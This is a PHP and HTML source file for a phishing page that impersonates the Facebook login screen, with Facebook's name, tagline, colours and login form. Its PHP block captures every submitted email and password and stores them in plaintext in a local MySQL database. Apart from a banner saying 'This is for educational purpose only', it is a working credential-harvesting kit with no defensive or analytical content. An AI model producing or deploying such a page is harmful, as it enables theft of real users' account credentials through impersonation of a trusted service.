<?php
if($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password']; // In a real application, you should hash the password

    // Database connection
    $conn = new mysqli('localhost', 'root', '', 'user_data');
    if($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    $sql = "INSERT INTO users (email, password) VALUES (?, ?)";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $email, $password);
    if($stmt->execute()) {
        echo "New record created successfully";
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }
    $stmt->close();
    $conn->close();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Login Page</title>
  <style>
    @import url("https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap");

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: "Poppins", sans-serif;
      background: #f2f4f7;
    }

    .educational-purpose {
      text-align: center;
      font-size: 2rem; /* Big */
      font-weight: bold; /* Bold */
      color: #fff;
      text-shadow: 0 0 10px #1877f2, 0 0 20px #1877f2, 0 0 30px #1877f2, 0 0 40px #1877f2; /* Glowing Effect */
      padding: 20px 0;
      background: rgba(0, 0, 0, 0.8);
      margin-bottom: 20px;
    }

    .content {
      position: relative;
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      flex-direction: column;
    }

    .flex-div {
      display: flex;
      justify-content: space-evenly;
      align-items: center;
    }

    .name-content {
      margin-right: 7rem;
    }

    .name-content .logo {
      font-size: 3.5rem;
      color: #1877f2;
    }

    .name-content p {
      font-size: 1.3rem;
      font-weight: 500;
      margin-bottom: 5rem;
    }

    form {
      display: flex;
      flex-direction: column;
      background: #fff;
      padding: 2rem;
      width: 530px;
      height: 380px;
      border-radius: 0.5rem;
      box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
    }

    form input {
      outline: none;
      padding: 0.8rem 1rem;
      margin-bottom: 0.8rem;
      font-size: 1.1rem;
    }

    form input:focus {
      border: 1.8px solid #1877f2;
    }

    form .login {
      outline: none;
      border: none;
      background: #1877f2;
      padding: 0.8rem 1rem;
      border-radius: 0.4rem;
      font-size: 1.1rem;
      color: #fff;
    }

    form .login:hover {
      background: #0f71f1;
      cursor: pointer;
    }

    form a {
      text-decoration: none;
      text-align: center;
      font-size: 1rem;
      padding-top: 0.8rem;
      color: #1877f2;
    }

    form hr {
      background: #f7f7f7;
      margin: 1rem;
    }

    form .create-account {
      outline: none;
      border: none;
      background: #06b909;
      padding: 0.8rem 1rem;
      border-radius: 0.4rem;
      font-size: 1.1rem;
      color: #fff;
      width: 75%;
      margin: 0 auto;
    }

    form .create-account:hover {
      background: #03ad06;
      cursor: pointer;
    }

    @media (max-width: 500px) {
      html {
        font-size: 60%;
      }

      .name-content {
        margin: 0;
        text-align: center;
      }

      .name-content .logo, .name-content p, form input, form .login, form a, form .create-account {
        font-size: 1.5rem;
      }

      form {
        width: 300px;
        height: fit-content;
      }

      .flex-div {
        flex-direction: column;
      }
    }
  </style>
</head>
<body>
  <div class="educational-purpose">This is for educational purpose only</div>
  <div class="content">
    <div class="flex-div">
      <div class="name-content">
        <h1 class="logo">Facebook</h1>
        <p>Connect with friends and the world around you on Facebook.</p>
      </div>
      <form action="index.php" method="post">
        <input type="text" name="email" placeholder="Email or Phone Number" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit" class="login">Log In</button>
        <a href="#">Forgot Password?</a>
    <hr>
    <button type="button" class="create-account">Create New Account</button>
</form>
    </div>
  </div>
</body>
</html>
